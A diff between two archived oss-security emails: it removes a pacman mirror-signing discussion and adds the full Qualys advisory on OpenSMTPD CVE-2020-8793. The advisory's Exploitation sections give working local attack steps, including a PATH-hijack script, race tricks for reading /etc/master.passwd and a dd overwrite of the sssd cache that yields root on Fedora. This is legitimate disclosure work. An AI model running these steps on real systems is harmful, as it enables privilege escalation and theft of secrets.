@@ -1,98 +1,386 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/04/21/8
-Message-ID: <6e208a52-10a1-3559-cf2e-44bca791941b@vdwaa.nl>
-Date: Tue, 21 Apr 2020 21:15:10 +0200
-From: Jelle van der Waa <jelle@...aa.nl>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/02/24/4
+Message-ID: <20200224183355.GC17396@localhost.localdomain>
+Date: Mon, 24 Feb 2020 10:33:55 -0800
+From: Qualys Security Advisory <qsa@...lys.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Pacman package manager - taking untrusted input
+Subject: Local information disclosure in OpenSMTPD (CVE-2020-8793)
 Content-Type: text/plain; charset=utf-8
 
-On 21/04/2020 20:47, Simon McVittie wrote:
-> On Tue, 21 Apr 2020 at 21:51:56 +0430, Amin Vakil wrote:
->> On 4/21/20 8:57 PM, jellicent@...tonmail.com wrote:
->>> The code supports database signatures, so the real issue is the distro
->>> infrastructure.
-> 
-> I interpret this as: pacman can accept either signed or unsigned
-> databases, but the various distros that use pacman (such as Arch Linux)
-> currently only publish unsigned databases in practice. Is that correct?
 
-This is correct for Arch Linux and this is also something the Arch Linux
-team wants to work on and is held up by figuring out a 'sane' way to
-sign a pacman database using gpg without compromising the signing key.
+Qualys Security Advisory
 
-> Can pacman be configured to *only* accept signed databases, so that a
-> mirror containing an unverifiable database (unsigned, signed with a key
-> that is not explicitly trusted, or with an invalid signature) is treated
-> as an error? If it cannot, then there's an obvious downgrade attack:
-> a malicious mirror could substitute an unsigned database and the pacman
-> client would happily use that.
-
-It can using SigLevel = Required in pacman.conf, as can be found in the
-man page http://jlk.fjfi.cvut.cz/arch/manpages/man/pacman.conf.5
-
-There is however another scenario which could be used even if the
-database was signed.
-
-1. Wait till a package has a critical security issue (RCE in nginx for
-example)
-2. As malicious mirror withhold updates, ie. no longer sync the
-repository with upstream
-3. Since the mirror is not updated the user will stay on the vulnerable
-version
-
-As a sidenote this can be circumvented by the administrator wondering
-why there are no updates (pretty rare for Arch :-) ) or running
-arch-audit which checks if the system has any vulnerable packages
-installed which hopefully gives away that the mirror is out of date and
-should be reported and changed.
-
-Note that we do remove mirrors which do not keep up from our mirrorlist,
-but changing mirror is still a manual task.
-
-> On Tue, 21 Apr 2020 at 17:41:42 +0000, jellicent@...tonmail.com wrote:
->> An attacker need only find a bug in how Pacman does
->> parsing/reading of the database file to potentially get code execution
->> on the box as root.
-> 
-> My understanding is that this is a risk, and at least arguably a design
-> flaw, but not generally considered to be a vulnerability (CVE IDs,
-> etc.) unless/until an unfixed parser bug with the necessary severity
-> is found.
-> 
-> Of course, that doesn't mean it wouldn't be a good idea to authenticate
-> the database before parsing it: that would mitigate a lot of potential
-> vulnerabilities.
-> 
-> Something that might be considered to be a vulnerability already (or not,
-> depending on the pacman and distro maintainers' threat models) is that
-> an attacker could substitute a database that lists obsolete packages
-> with known vulnerabilities. Those packages will presumably be validly
-> signed by distro developers (because at one time they were considered
-> to be the best version available). Presumably pacman won't normally
-> downgrade from the version it has installed to a strictly older version
-> from a mirror, but if a user installs a new (not currently installed)
-> package using that mirror/database, they'll unknowingly be installing
-> an older package that has known vulnerabilities.
-> 
-> That form of attack is difficult to address in general, because it needs
-> a revocation or expiry mechanism. apt-based distros are starting to
-> address equivalent issues by setting a Valid-Until field on their archive
-> metadata, so that clients will warn their user if presented with outdated
-> archive metadata (the equivalent of pacman's database) - although this is
-> somewhat awkward to deploy, because it requires a signing key to be
-> made available on a regular basis, which conflicts with the idea that
-> high-value signing keys should be kept offline when not in use.
-
-A pacman developer has proposed a patchset to implement an expiry for
-repo database.
-
-https://lists.archlinux.org/pipermail/pacman-dev/2019-December/023909.html
-
-P.S. for reporting security issues regarding Arch Linux's infra,
-packages and package manager security@...hlinux.org is preferred to be
-used :)
+Local information disclosure in OpenSMTPD (CVE-2020-8793)
 
 
+==============================================================================
+Contents
+==============================================================================
 
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
+Summary
+Analysis
+Exploitation
+POKE 47196, 201
+Acknowledgments
+
+
+==============================================================================
+Summary
+==============================================================================
+
+We discovered a minor vulnerability in OpenSMTPD, OpenBSD's mail server:
+an unprivileged local attacker can read the first line of an arbitrary
+file (for example, root's password hash in /etc/master.passwd) or the
+entire contents of another user's file (if this file and
+/var/spool/smtpd/ are on the same filesystem).
+
+We developed a proof of concept and successfully tested it against
+OpenBSD 6.6 (the current release). This vulnerability is generally not
+exploitable on Linux, because /proc/sys/fs/protected_hardlinks is 1 by
+default on most distributions. Surprisingly, however, it is exploitable
+on Fedora (31) and yields full root privileges.
+
+
+==============================================================================
+Analysis
+==============================================================================
+
+In October 2015 we published the results of an exhaustive OpenSMTPD
+audit (https://www.qualys.com/2015/10/02/opensmtpd-audit-report.txt);
+one of our key findings was:
+
+------------------------------------------------------------------------------
+Multiple hardlink attacks in the offline directory
+...
+
+In the world-writable "/var/spool/smtpd/offline" directory, local users
+can create hardlinks to files they do not own, and wait until the server
+reboots (or, crash OpenSMTPD with a denial-of-service and wait until the
+administrator restarts it) to carry out assorted attacks.
+...
+
+2/ The following code in offline_enqueue() allows an attacker to
+execvp() "/usr/sbin/smtpctl" as "sendmail", with a command-line argument
+that is the hardlinked file's first line (CVE-2015-ABCD):
+...
+
+For example, an attacker can hardlink /etc/master.passwd to the offline
+directory, and retrieve its first line (root's encrypted password) by
+running ps (or a small program that simply calls sysctl() with
+KERN_FILE_BYUID and KERN_PROC_ARGV) in a loop:
+...
+
+4/ If an attacker is able to reach another user's file (i.e., +x on all
+directories that lead to the file) but not read it, he can hardlink the
+file to the offline directory, and wait for savedeadletter() to create a
+world-readable copy of the file in this other user's home directory:
+------------------------------------------------------------------------------
+
+OpenBSD's patch for this vulnerability was threefold:
+
+a/ They removed the world-writable and sticky bits from
+/var/spool/smtpd/offline, changed its group to "_smtpq", and made
+/usr/sbin/smtpctl set-group-ID _smtpq:
+
+------------------------------------------------------------------------------
+drwxrwx---  2 root  _smtpq     512 Oct 12 10:34 /var/spool/smtpd/offline
+-r-xr-sr-x  1 root  _smtpq  217736 Oct 12 10:34 /usr/sbin/smtpctl
+------------------------------------------------------------------------------
+
+b/ They added an _smtpq group check to offline_scan():
+
+------------------------------------------------------------------------------
+1543                 /* offline file group must match parent directory group */
+1544                 if (e->fts_statp->st_gid != e->fts_parent->fts_statp->st_gid)
+1545                         continue;
+....
+1553                 if (offline_add(e->fts_name)) {
+1554                         log_warnx("warn: smtpd: "
+1555                             "could not add offline message %s", e->fts_name);
+1556                         continue;
+1557                 }
+------------------------------------------------------------------------------
+
+This check (at line 1544) effectively prevents offline_scan() from
+adding the filename of a hardlink to the offline queue (at line 1553),
+because no interesting file on the filesystem belongs to the group
+_smtpq.
+
+c/ They added a hardlink check to offline_enqueue() (at line 1631),
+which is called by offline_add():
+
+------------------------------------------------------------------------------
+1615                 if ((fd = open(path, O_RDONLY|O_NOFOLLOW|O_NONBLOCK)) == -1) {
+1616                         log_warn("warn: smtpd: open: %s", path);
+1617                         _exit(1);
+1618                 }
+1619
+1620                 if (fstat(fd, &sb) == -1) {
+1621                         log_warn("warn: smtpd: fstat: %s", path);
+1622                         _exit(1);
+1623                 }
+....
+1631                 if (sb.st_nlink != 1) {
+1632                         log_warnx("warn: smtpd: file %s is hard-link", path);
+1633                         _exit(1);
+1634                 }
+------------------------------------------------------------------------------
+
+Unfortunately, a/ is vulnerable to a Local Privilege Escalation (into
+the group _smtpq), and b/ and c/ are vulnerable to TOCTOU (time-of-check
+to time-of-use) race conditions. As a result, a local attacker can still
+carry out the hardlink attacks 2/ (master.passwd) and 4/ (dead.letter)
+described in our 2015 audit report.
+
+
+==============================================================================
+Exploitation
+==============================================================================
+
+a/ If we execute /usr/sbin/smtpctl as "sendmail" or "send-mail", and
+specify a "-bi" command-line argument, then smtpctl calls execlp()
+without dropping its privileges:
+
+------------------------------------------------------------------------------
+147         /* sendmail-compat makemap ... re-execute using proper interface */
+148         if (argc == 2) {
+...
+164                 execlp("makemap", "makemap", "-d", argv[0], "-o", dbname, "-",
+165                     (char *)NULL);
+166                 err(1, "execlp");
+167         }
+------------------------------------------------------------------------------
+
+We can exploit this execlp() call by specifying our own PATH environment
+variable, and obtain the privileges of the group _smtpq:
+
+------------------------------------------------------------------------------
+$ id
+uid=1001(john) gid=1001(john) groups=1001(john)
+
+$ ln -s /usr/sbin/smtpctl "send-mail"
+
+$ cat > makemap << "EOF"
+#!/bin/ksh
+echo "$@"
+exec /usr/bin/env -i /bin/ksh
+EOF
+
+$ chmod 0755 makemap
+
+$ env -i PATH=. ./send-mail -- -bi dbname
+-d -bi -o dbname.db -
+
+$ id
+uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
+------------------------------------------------------------------------------
+
+b/ The _smtpq group check is made only once in offline_scan(), but not
+again in offline_enqueue() (which actually open()s the offline files).
+Moreover, at most five offline files are processed concurrently; the
+remaining files are simply added to the offline queue for later
+processing. We can reliably win this first race condition:
+
+- we create several large but sparse files (1GB each) in the offline
+  directory (these files naturally pass the _smtpq group check);
+
+- we SIGSTOP five of the offline_enqueue() processes that open() and
+  slowly read() our large files;
+
+- we wait until offline_scan() adds all of our remaining files to the
+  offline queue;
+
+- we replace these files with hardlinks to an interesting target file
+  (for example, /etc/master.passwd);
+
+- we SIGKILL the five stopped offline_enqueue() processes.
+
+Finally, our hardlinks are processed by offline_enqueue(), and the
+_smtpq group check is defeated.
+
+c/ To defeat the hardlink check in offline_enqueue(), we create our
+hardlink before the open() call at line 1615 (this increases st_nlink to
+2), and delete it before the fstat() call at line 1620 (this decreases
+st_nlink back to 1). In practice, we win this tight race condition after
+just a few tries: our proof of concept fork()s a dedicated process that
+simply calls link() and unlink() in a loop.
+
+Moreover, if our target file is /etc/master.passwd, we can defeat the
+hardlink check without a race: we hardlink /etc/master.passwd into the
+offline directory (this increases st_nlink to 2), we run /usr/bin/passwd
+or /usr/bin/chpass to generate a new /etc/master.passwd (this decreases
+st_nlink back to 1), and finally we SIGKILL the five stopped
+offline_enqueue() processes.
+
+------------------------------------------------------------------------------
+
+For example, to read the first line of /etc/master.passwd (root's
+password hash) with our proof of concept:
+
+- First, on the attacker's terminal:
+
+$ id
+uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
+
+$ ./proof-of-concept 20
+...
+ready
+
+- Next, on the administrator's terminal:
+
+# rcctl restart smtpd
+smtpd(ok)
+smtpd(ok)
+
+- Last, on the attacker's terminal:
+
+...
+root:$2b$10$xufPzZW36O2h2QmasLsjve8RyRQm0gu3mVX6IHE2nAYYD0Iw0gAnO:0:0:daemon:0:0:Charlie &:/root:/bin/ksh
+
+------------------------------------------------------------------------------
+
+To read the entire contents of another user's file (for example,
+/home/admin/deep.secret) with our proof of concept:
+
+- First, on the attacker's terminal:
+
+$ id
+uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
+
+$ ls -l /home/admin/deep.secret
+----------  1 admin  admin  125 Feb 15 00:52 /home/admin/deep.secret
+
+$ cat /home/admin/deep.secret
+cat: /home/admin/deep.secret: Permission denied
+
+$ ./proof-of-concept 100 /home/admin/deep.secret
+...
+ready
+
+- Next, on the administrator's terminal:
+
+# rcctl restart smtpd
+smtpd(ok)
+smtpd(ok)
+
+- Last, on the attacker's terminal:
+
+...
+This is the contents of the deep.secret file.  Only root may see this file.
+-rw-r--r--  1 admin  admin  132 Feb 15 01:21 /home/admin/dead.letter
+
+$ cat /home/admin/dead.letter
+From: admin <admin@...d66.my.domain>
+Date: Sat, 15 Feb 2020 01:21:03 -0700 (MST)
+
+secret 2
+secret 3
+end of secret file deep.secret
+
+
+==============================================================================
+POKE 47196, 201
+==============================================================================
+
+On Linux, this vulnerability is generally not exploitable because
+/proc/sys/fs/protected_hardlinks prevents attackers from creating
+hardlinks to files they do not own. On Fedora 31, however, smtpctl is
+set-group-ID root, not set-group-ID smtpq:
+
+------------------------------------------------------------------------------
+-r-xr-sr-x. 1 root root 303368 Jul 26  2019 /usr/sbin/smtpctl
+------------------------------------------------------------------------------
+
+Surprisingly, we were able to exploit this mistake and obtain full root
+privileges:
+
+- First, we exploited the Local Privilege Escalation in smtpctl to
+  obtain the privileges of the group root:
+
+------------------------------------------------------------------------------
+$ id
+uid=1001(john) gid=1001(john) groups=1001(john) context=...
+
+$ ln -s /usr/sbin/smtpctl "send-mail"
+
+$ cat > makemap << "EOF"
+#!/bin/bash -p
+echo "$@"
+exec /usr/bin/env -i /bin/bash -p
+EOF
+
+$ chmod 0755 makemap
+
+$ env -i PATH=. ./send-mail -- -bi dbname
+-d -bi -o dbname.db -
+
+$ id
+uid=1001(john) gid=1001(john) egid=0(root) groups=0(root),1001(john) context=...
+------------------------------------------------------------------------------
+
+- Next, we searched for files that belong to the group root, are
+  group-writable, but not world-writable:
+
+------------------------------------------------------------------------------
+$ find / -group root -perm -020 '!' -perm -02 -ls
+  ...
+  4811008      0 drwxrwxr-x   2  root     root           51 Feb 15 17:49 /var/lib/sss/mc
+  4811064   8212 -rw-rw-r--   1  root     root      8406312 Feb 15 18:58 /var/lib/sss/mc/passwd
+  4810978   6260 -rw-rw-r--   1  root     root      6406312 Feb 15 18:58 /var/lib/sss/mc/group
+  ...
+------------------------------------------------------------------------------
+
+- Intrigued ("sss" stands for "System Security Services"), we dumped the
+  contents of /var/lib/sss/mc/passwd:
+
+------------------------------------------------------------------------------
+$ hexdump -C /var/lib/sss/mc/passwd
+...
+00000060  10 00 00 00 e9 03 00 00  e9 03 00 00 1d 00 00 00  |................|
+00000070  6a 6f 68 6e 00 78 00 00  2f 68 6f 6d 65 2f 6a 6f  |john.x../home/jo|
+00000080  68 6e 00 2f 62 69 6e 2f  62 61 73 68 00 ff ff ff  |hn./bin/bash....|
+...
+------------------------------------------------------------------------------
+
+- Feeling adventurous, we overwrote "e9 03 00 00" (1001, our user-ID)
+  with zeros (root's user-ID):
+
+------------------------------------------------------------------------------
+$ dd if=/dev/zero of=/var/lib/sss/mc/passwd bs=1 seek=$((0x64)) count=4 conv=notrunc
+4+0 records in
+4+0 records out
+------------------------------------------------------------------------------
+
+- Last, we executed su to re-authenticate as ourselves (as user john),
+  but obtained a root shell instead:
+
+------------------------------------------------------------------------------
+$ su -l john
+Password:
+
+# id
+uid=0(root) gid=1001(john) groups=1001(john) context=...
+------------------------------------------------------------------------------
+
+Last-minute note: on February 9, 2020, opensmtpd-6.6.2p1-1.fc31 was
+released and correctly made smtpctl set-group-ID smtpq, instead of
+set-group-ID root.
+
+
+==============================================================================
+Acknowledgments
+==============================================================================
+
+We thank OpenBSD's developers, Todd Miller in particular, for their
+quick response and patches. We also thank Solar Designer and MITRE's CVE
+Assignment Team.
+
+
+
+[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
+
+
+
+This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
+
+View attachment "proof-of-concept.c" of type "text/plain" (16554 bytes)
